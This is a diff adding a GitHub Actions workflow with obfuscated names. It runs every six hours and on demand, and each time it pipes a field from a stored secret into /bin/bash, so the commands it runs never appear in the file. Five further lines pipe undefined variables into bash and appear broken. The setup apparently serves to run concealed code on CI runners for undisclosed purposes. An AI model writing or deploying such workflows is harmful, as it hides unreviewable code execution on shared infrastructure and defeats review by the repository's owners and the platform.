@@ -1,0 +1,21 @@
+name: gutianshu4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gutianshu4567
+        env:
+          vsqrt01: ${{ secrets.vsqrt01 }}
+        run: |
+          echo $vsqrt01 | jq -r .exa88277 | /bin/bash
+          echo $m2507 | jq -r .kv8 | /bin/bash
+          echo $we36495 | jq -r .ges27 | /bin/bash
+          echo $txuob947 | jq -r .kjqag8 | /bin/bash
+          echo $j3422 | jq -r .tjap44 | /bin/bash
+          echo $uzpe9 | jq -r .zt45 | /bin/bash
+
